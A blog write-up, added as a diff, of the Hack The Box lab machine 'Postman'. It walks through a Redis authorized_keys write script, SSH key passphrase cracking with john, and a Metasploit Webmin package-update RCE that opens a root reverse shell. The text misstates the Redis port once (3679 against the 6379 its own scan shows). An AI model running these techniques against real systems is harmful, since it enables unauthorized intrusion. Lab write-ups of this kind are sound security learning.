@@ -1,0 +1,315 @@
+---
+layout: htb_box
+title: "HTB: Postman"
+code: htb_postman
+long_date: "24th December 2019"
+author: rubytox
+---
+
+<p>Hello everyone!</p>
+
+<p>Today, I’m publishing a writeup about the box Postman from <a href="http://hackthebox.eu/">Hackthebox</a>,
+    made by <a href="https://www.hackthebox.eu/home/users/profile/114053">TheCyberGeek</a>.</p>
+
+<p>It was rated easy by the maker, and it’s my second one. I got to improve a lot of my skills especially in enumeration,
+    and I got the opportunity to discover new tools and services. Let’s get started!<!--more--></p>
+
+<p>As in <a href="{% link _posts/writeups/HTB/2019-11-27-Wall.html %}">HTB: Wall</a>, I’m going to start by adding the IP <code>10.10.10.160</code> in the
+    file <code>/etc/hosts</code> in order to access the machine by typing <code>postman.ctf</code>. Now, we can really start.</p>
+
+<p>As usual, we’re going to use nmap to scan all ports, which gives us the following result:</p>
+
+<pre class="prettyprint nocode">
+Starting Nmap 7.60 ( https://nmap.org ) at 2019-11-26 23:06 CET
+Nmap scan report for postman.ctf (10.10.10.160)
+Host is up (0.59s latency).
+Not shown: 997 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
+|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
+|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (EdDSA)
+80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: The Cyber Geek's Personal Website
+10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 164.31 seconds
+</pre>
+
+<p>So we have HTTP port 80 open with Apache running on it, and something which seems to be another web server,
+    running on port 10000. First of all, let’s look at the website using Apache: it’s a basic static website which
+    isn’t really interesting. I looked a bit around, tried to enumerate some directories using <code>dirb</code>,
+    but nothing relevant.</p>
+
+<p>So I decided that I was going to look at the second website, running on port 10000.
+    I came across the following login form:</p>
+
+<img src="/img/{{ page.code }}/webmin.png" alt="Webmin login form" />
+
+<p>So I needed to know what was Webmin, and made some researches. According to Wikipedia<sup><a href="#fn1" id="ref1">1</a></sup>, Webmin is a system
+    configuration and management tool. After trying to bruteforce a little bit the form, we got banned for a while,
+    which reminded us that usually bruteforcing wasn’t the way to own Hackthebox boxes…</p>
+
+<p>I tried to look for an exploit for Webmin, and I found an interesting vulnerability which allowed to perform
+    command injection: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15107">CVE-2019-15107</a>,
+    which targeted Webmin up to version 1.920. So our version is vulnerable, and
+    I thought we were going to use this CVE right now.</p>
+
+<p>However, it didn’t work as planned, and trying to exploit it manually showed us why.
+    The CVE worked by injecting commands in the reset password page of Webmin: first, when going on the page
+    <code>https://postman.ctf:10000/password_reset.cgi</code>, we are given a security error, which complains about a <code>Referer</code>
+    field not being set in the request's header. Using Burpsuite, we can set this <code>Referer</code> field to a valid value, such as
+    the website address, and successfully reach the <code>password_change.cgi</code> page:</p>
+
+<img src="/img/{{ page.code }}/pass_change.png" alt="Password changing is disabled" />
+
+<p>That’s sad! I guess the exploit won’t work then. At this moment, I had no idea what to do, and after a while I
+    looked at some hints on the Hackthebox forum: people explained that there was another open port
+    which wasn’t found by <code>nmap</code>.</p>
+
+<p>I learned about another tool to scan ports: <code>masscan</code><sup><a href="#fn2" id="ref2">2</a></sup>.
+    I used the following command to scan the ports again:</p>
+
+<pre class="prettyprint nocode">
+$ sudo masscan -p1-10000 10.10.10.160 --rate 10000 -e tun0
+Starting masscan 1.0.6 (http://bit.ly/14GZzcT) at 2019-12-24 19:31:43 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [10000 ports/host]
+Discovered open port 6379/tcp on 10.10.10.160
+</pre>
+
+<p><strong>Note:</strong> we have to specify the interface <code>tun0</code> because <code>masscan</code> doesn’t find anything if we don’t;
+    guess he’s using the default interface if we don’t tell him.</p>
+
+<p>We found that the port 3679 is open! Browsing Google, we find that 3679 is the default port for the software
+    Redis<sup><a href="#fn3" id="ref3">3</a></sup>: basically, it’s a software managing sort of a database. I didn’t find any interesting exploit for this,
+    but there is a much easier way to get a shell: the tool <code>redis-cli</code> allows to manage the Redis software, and in our
+    case, no password is required. So we can easily connect to the server using the following command:</p>
+
+<pre class="prettyprint nocode">
+$ redis-cli -h postman.ctf -p 6379
+postman.ctf:6379>
+</pre>
+
+<p>Now, we need to think a little bit: the Redis software comes with a user <code>redis</code>, whose home is in <code>/var/lib/redis</code>.
+    So basically, if we are able to write something to the file <code>/var/lib/redis/.ssh/authorized_keys</code>, we should be able
+    to SSH to the user <code>redis</code>' account.</p>
+
+<p>So first, we’re going to generate a pair of RSA public/private keys, and we’ll put the public key in a file <code>foo.txt</code>.
+    Then, we can write a small bash script which will do what we explained just above:</p>
+
+<pre class="prettyprint">
+#!/bin/bash
+
+redis-cli -h postman.ctf -p 6379 flushall
+cat foo.txt | redis-cli -h postman.ctf -p 6379 -x set bb
+redis-cli -h postman.ctf -p 6379 config set dir "/var/lib/redis/.ssh"
+redis-cli -h postman.ctf -p 6379 config set dbfilename "authorized_keys"
+redis-cli -h postman.ctf -p 6379 save
+</pre>
+
+<p>The script explained:</p>
+<ul>
+    <li>we remove all the keys currently saved in the database: this allows us to perform our operations in a clean environment;</li>
+    <li>we create a key in the database called bb which would contain our public key;</li>
+    <li>we change directory to the .ssh directory of the redis user;</li>
+    <li>we set the filename in which we want to write data to authorized_keys;</li>
+    <li>we write the content of the keys in the file.</li>
+</ul>
+
+<p>When we execute this script, each line should print the string “OK” in the terminal.
+    When everything is all right, we can connect with SSH to the <code>redis</code> user:</p>
+
+<pre class="prettyprint nocode">
+$ ssh -i id_rsa redis@postman.ctf
+redis@Postman:~$
+</pre>
+
+<p>We got a low-privileged shell!</p>
+
+<p>Let’s change directory to <code>/home</code>: we find that there’s a user called Matt.</p>
+
+<pre class="prettyprint nocode">
+redis@Postman:/home$ ls -l
+total 4
+drwxr-xr-x 6 Matt Matt 4096 Sep 11 11:28 Matt
+</pre>
+
+<p>His home directory is executable and readable for everybody! When we browse to Matt’s home directory, we find a
+    file <code>user.txt</code>, containing the user flag. We just have to read it:</p>
+
+<pre class="prettyprint nocode">
+redis@Postman:/home/Matt$ cat user.txt
+cat: user.txt: Permission denied
+</pre>
+
+<p>Oh no! We have to find another way to read this file. I was stuck for a very long time at this step because
+    I couldn’t find anything interesting. At last, I looked in the <code>/opt</code> folder, which contained a file called <code>id_rsa.bak</code>.
+    This must be a RSA private key file. Reading the content of the file, we learn that the file is an encrypted
+    private key. We use the tool <code>ssh2john</code> to get the hash of the passphrase:</p>
+
+<pre class="prettyprint nocode">
+$ ssh2john id_rsa.bak > hash
+$ cat hash
+id_rsa.bak:$sshng$0$8$73E9CEFBCCF5287C$1192$25e840e75235eebb0238e56ac96c7e0bcdfadc[...]b4c8538da3ab44d63
+</pre>
+
+<p>Then the hash is easily cracked using <code>john</code> and the wordlist rockyou:</p>
+
+<pre class="prettyprint nocode">
+$ john --wordlist=rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
+Cost 2 (iteration count) is 2 for all loaded hashes
+Will run 8 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+computer2008     (id_rsa.bak)
+Warning: Only 1 candidate left, minimum 8 needed for performance.
+1g 0:00:00:07 DONE (2019-12-26 00:51) 0.1280g/s 1836Kp/s 1836Kc/s 1836KC/s *7¡Vamos!Session completed
+</pre>
+
+<p>So now that we found the passphrase for the private key, we’re going to try connecting to the user Matt by SSH:
+    it doesn’t work, the server instantly closes the connection. This might be because the user Matt isn’t allowed
+    to connect to the machine through SSH.</p>
+
+<p>I then noticed that when I try to connect to the Webmin panel using the login Matt and the password computer2008,
+    it works: the Wikipedia page tells us that Webmin is an adminstration tool for users as well, so it doesn’t
+    surprise me that users can connect to it using their usual credentials. We can then guess that computer2008 might
+    be the actual password of the user Matt on the machine. Let’s check that: we connect to the <code>redis</code> user by SSH
+    using the previous way, then we type:</p>
+
+<pre class="prettyprint nocode">
+$ su Matt
+Password: computer2008
+Matt@Postman:/var/lib/redis$ cat ~/user.txt
+517ad[-- REDACTED --]a2f3c
+</pre>
+
+<p>So we guessed right, and we owned user! Now, let’s own root.</p>
+
+<p>Starting from this point, I wanted so badly to use the first exploit I mentioned at the beginning of this post,
+    that I got stuck for some days. However, I realised that there might be other exploits which could work!
+    In fact, there was another RCE using the package update functionality of Webmin: <a href="https://www.cvedetails.com/cve/CVE-2019-12840/">CVE-2019-12840</a>.
+    With this exploit, we can use remote code execution in order to get a high privilege shell.
+    For this box, we’re going to use Metasploit, as there already exists a module which does the work.</p>
+
+<p>As it’s one of the first times I’m using Metasploit, I’m going to explain in details the commands I use.
+    First, after having launched the console with <code>sudo msfconsole</code>, we search for the modules targetting Webmin:</p>
+
+<pre class="prettyprint nocode">
+msf5 > search webmin
+   #  Name                                         Disclosure Date  Rank       Check  Description
+   -  ----                                         ---------------  ----       -----  -----------
+   0  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
+   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
+   2  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
+   3  exploit/unix/webapp/webmin_backdoor          2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
+   4  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
+   5  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
+</pre>
+
+<p>We find the exploit we want to use, and we show what parameters we have to set in order to use it:</p>
+
+<pre class="prettyprint nocode">
+msf5 > use exploit/linux/http/webmin_packageup_rce
+msf5 exploit(linux/http/webmin_packageup_rce) > show options
+Module options (exploit/linux/http/webmin_packageup_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    yes       Webmin Password
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      10000            yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base path for Webmin application
+   USERNAME                    yes       Webmin Username
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Webmin <= 1.910
+</pre>
+
+<p>So as this is an authenticated RCE, we need to set the fields <code>password</code> and <code>username</code>.
+    Then, we don’t forget that the Webmin interface must be accessed through HTTPS, so we set the <code>SSL</code> field to <code>true</code>.
+    Obviously, we must set <code>RHOSTS</code> to the address we want to target. Finally, we specifiy the field <code>LHOST</code> which stands
+    for the address of the machine to which the remote shell will be opened (our IP address here):</p>
+
+<pre class="prettyprint nocode">
+msf5 exploit(linux/http/webmin_packageup_rce) > set password computer2008
+password => computer2008
+msf5 exploit(linux/http/webmin_packageup_rce) > set username Matt
+username => Matt
+msf5 exploit(linux/http/webmin_packageup_rce) > set SSL true
+SSL => true
+msf5 exploit(linux/http/webmin_packageup_rce) > set RHOSTS postman.ctf
+RHOSTS => postman.ctf
+msf5 exploit(linux/http/webmin_packageup_rce) > set LHOST 10.10.16.46
+LHOST => 10.10.16.46
+</pre>
+
+<p>Then, we use the <code>check</code> command to check whether the target is vulnerable to our exploit:</p>
+
+<pre class="prettyprint nocode">
+msf5 exploit(linux/http/webmin_packageup_rce) > check
+
+[*] NICE! Matt has the right to >>Package Update<<
+[+] 10.10.10.160:10000 - The target is vulnerable.
+</pre>
+
+<p>As we can see, the user Matt has enough privilege to update packages, which is required for this exploit.
+    Finally, we can run the exploit using the command <code>run</code> or <code>exploit</code>, and we have our reverse shell!</p>
+
+<pre class="prettyprint nocode">
+msf5 exploit(linux/http/webmin_packageup_rce) > exploit
+
+[*] Started reverse TCP handler on 10.10.16.46:4444
+[+] Session cookie: 37fbf644ae77ddfaebac994f86a7c407
+[*] Attempting to execute the payload...
+[*] Command shell session 1 opened (10.10.16.46:4444 -> 10.10.10.160:32776) at 2019-12-26 01:38:05 +0100
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+cat /root/root.txt
+a2577[-- REDACTED --]6ddce
+</pre>
+
+<p>And we owned root!</p>
+
+<p>This box was pretty fun and I think I learned a lot about making researches while trying to own it. I hope that this writeup could have been useful for some of you!</p>
+
+<p>So this is over for this box! If you have any comments or suggestions, feel free to open an issue on <a href="https://github.com/Rubytox/Rubytox.github.io">this website's GitHub page</a>.</p>
+
+
+<!-- Footnotes -->
+
+<hr />
+
+<sup id="fn1">1. <a href="https://en.wikipedia.org/wiki/Webmin">https://en.wikipedia.org/wiki/Webmin</a><a href="#ref1" title="Jump back to footnote 1 in the text.">↩</a></sup>
+<br>
+
+<sup id="fn2">2. <a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a><a href="#ref2" title="Jump back to footnote 2 in the text.">↩</a></sup>
+<br>
+
+<sup id="fn3">3. <a href="https://en.wikipedia.org/wiki/Redis">https://en.wikipedia.org/wiki/Redis</a><a href="#ref3" title="Jump back to footnote 3 in the text.">↩</a></sup>
